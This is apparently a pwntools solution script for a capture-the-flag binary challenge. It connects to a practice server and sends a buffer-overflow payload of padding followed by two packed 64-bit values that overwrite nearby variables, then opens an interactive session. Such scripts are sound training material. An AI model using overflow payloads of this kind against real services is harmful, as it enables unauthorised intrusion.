from pwn import *

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

#p = process('./task_gettingStart_ktQeERc')
p = remote('node4.buuoj.cn', 29847)

sa(b'depends on you.', b'a' * 0x18 + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A))

p.interactive()